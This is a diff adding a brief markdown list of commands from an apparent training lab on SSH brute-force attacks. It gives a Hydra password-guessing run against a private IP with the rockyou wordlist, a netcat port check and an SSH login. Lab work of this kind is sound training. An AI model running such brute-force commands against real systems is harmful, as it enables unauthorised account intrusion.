@@ -1,0 +1,10 @@
+# Commands Used in Lab 01 (SSH Brute Force Attack)
+
+## Hydra Commands
+hydra -l victim -P /usr/share/wordlists/rockyou.txt ssh://172.20.89.126
+
+## Netcat Port Scan
+nc -vz 172.20.89.126 22
+
+## SSH Login
+ssh victim@172.20.89.126
